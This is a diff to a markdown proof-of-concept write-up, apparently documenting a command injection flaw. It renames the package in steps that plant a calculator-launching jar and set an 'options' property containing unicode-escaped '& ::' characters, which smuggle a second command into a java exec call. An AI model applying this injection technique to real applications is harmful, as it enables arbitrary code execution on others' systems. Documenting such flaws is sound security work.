@@ -37,7 +37,7 @@ options=
 Save the following java code into a file named `Calc.java`. It is important to add the package at the beginning of the file.
 
 ```
-package injection;
+package command.injection;
 
 import java.io.IOException;
 
@@ -62,16 +62,17 @@ Next, follow the command with the name of the jar (test.jar) and the entry point
 Lastly, use `-C . <packagename>/` to get the class files from the specified folder, preserving the folder structure.
 
 ```
-jar cvfeP calc.jar .Calc -C . injection/
+jar cvfeP calc.jar .Calc -C . command/injection/
 ```
 
 Open the calc.jar file in a zip program. It should have the following structure:
 
 ```
-META-INF
-| MANIFEST.MF
-injection
-| Calc.class
+command/
+├─ injection/
+│  ├─ Calc.class
+META-INF/
+├─ MANIFEST.MF
 ```
 
 The `MANIFEST.MF` should contain the following:
@@ -79,7 +80,7 @@ The `MANIFEST.MF` should contain the following:
 ```
 Manifest-Version: 1.0
 Created-By: <JDK Version> (Oracle Corporation)
-Main-Class: amatas.Calc
+Main-Class: command.injection.Calc
 ```
 
 If you edit your manifest by hand, be sure to keep the newline at the end otherwise java doesn't recognize it.
@@ -89,7 +90,7 @@ Place `calc.jar` into the `/dependencies` directory of the target application.
 Add the following property to the `application.properties` file of the application:
 
 ```
-options=injection.Calc\u0020\u0026\u003A\u003A\u0020
+options=command.injection.Calc\u0020\u0026\u003A\u003A\u0020
 ```
 
 Run the target application and observe that the calculator application will open instead of the intended source.
@@ -97,7 +98,7 @@ Run the target application and observe that the calculator application will open
 Below is the value that had entered the `exec` function.
 
 ```
-"C:/Program Files/Java/jre1.8.0_111/bin/javaw" -cp ".;./dependencies/*\" injection.Calc &:: com.example.main.Example
+"C:/Program Files/Java/jre1.8.0_111/bin/javaw" -cp ".;./dependencies/*\" command.injection.Calc &:: com.example.main.Example
 ```
 
 ## References
